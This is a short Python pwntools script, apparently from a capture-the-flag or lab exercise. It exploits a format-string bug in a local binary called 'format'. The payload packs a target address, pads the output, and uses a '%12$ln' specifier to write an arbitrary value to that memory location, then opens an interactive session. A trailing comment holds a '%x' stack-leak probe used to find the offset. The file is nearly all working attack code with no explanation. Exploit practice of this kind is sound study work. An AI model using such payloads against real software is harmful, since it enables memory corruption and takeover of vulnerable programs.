from pwn import * 

BIN = "./format"

target = 0x0804c028


def exploit():
	payload = p32(target) + b"%16930112d" + b"%12$ln"
	io.sendline(payload)
	io.interactive()

io = process(BIN)
exploit()


#ABCD%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x